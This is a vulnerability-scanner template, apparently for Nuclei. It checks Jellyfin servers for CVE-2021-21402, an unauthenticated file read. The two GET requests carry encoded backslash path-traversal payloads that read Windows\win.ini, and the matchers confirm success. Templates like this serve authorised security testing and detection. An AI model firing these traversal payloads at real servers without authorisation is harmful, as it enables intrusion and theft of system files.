id: CVE-2021-21402

info:
  name: Jellyfin prior to 10.7.0 Unauthenticated Arbitrary File Read
  author: dwisiswant0
  severity: high
  description: |
    Jellyfin allows unauthenticated arbitrary file read. This issue is more prevalent when
    Windows is used as the host OS. Servers that are exposed to the public Internet are
    potentially at risk. This is fixed in version 10.7.1.
  reference: https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/
  tags: cve,cve2021,jellyfin,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/"
      - "{{BaseURL}}/Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Content-Type: application/octet-stream"
        part: header
      - type: regex
        regex:
          - "\\[(font|extension|file)s\\]"
        part: body